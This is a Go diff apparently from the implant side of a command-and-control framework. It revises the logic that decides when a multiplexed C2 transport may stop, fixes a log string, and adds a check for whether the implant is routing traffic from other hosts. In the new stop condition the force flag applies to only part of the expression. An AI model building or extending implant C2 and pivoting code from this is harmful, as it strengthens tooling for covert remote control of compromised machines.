@@ -324,11 +324,14 @@ func (t *Transport) NewStreamC2() (c2 *Connection, err error) {
 func (t *Transport) Stop(force bool) (err error) {
 
 	if t.IsMux {
-		// 1, because we assume the RPC C2 stream is still up.
-		if t.multiplexer.NumStreams() > 1 && !force {
-			return fmt.Errorf("Cannot stop transport: %d streams still opened",
-				t.multiplexer.NumStreams())
+		activeStreams := t.multiplexer.NumStreams()
+
+		// If there is an active C2, there is at least one open stream,
+		// that we do not count as "important" when stopping the Transport.
+		if (t.C2 != nil && activeStreams > 1) || (t.C2 == nil && activeStreams > 0) && !force {
+			return fmt.Errorf("Cannot stop transport: %d streams still opened", activeStreams)
 		}
+
 		// {{if .Config.Debug}}
 		log.Printf("[mux] closing all muxed streams")
 		// {{end}}
@@ -353,7 +356,7 @@ func (t *Transport) Stop(force bool) (err error) {
 	}
 
 	// {{if .Config.Debug}}
-	log.Printf("Transport closed (%s", activeC2)
+	log.Printf("Transport closed (%s)", activeC2)
 	// {{end}}
 	return
 }
@@ -445,6 +448,23 @@ func (t *Transport) phyConnFallBack() (err error) {
 	// Wrap RPC layer around physical conn here.
 
 	return
+}
+
+// IsRouting - The transport checks if it is routing traffic that does not originate from this implant.
+func (t *Transport) IsRouting() bool {
+
+	if t.IsMux {
+		activeStreams := t.multiplexer.NumStreams()
+		// If there is an active C2, there is at least one open stream,
+		// that we do not count as "important" when stopping the Transport.
+		if (t.C2 != nil && activeStreams > 1) || (t.C2 == nil && activeStreams > 0) {
+			return true
+		}
+		// Else we don't have any non-implant streams.
+		return false
+	}
+	// If no mux, no routing.
+	return false
 }
 
 func transport(rw1, rw2 io.ReadWriter) error {
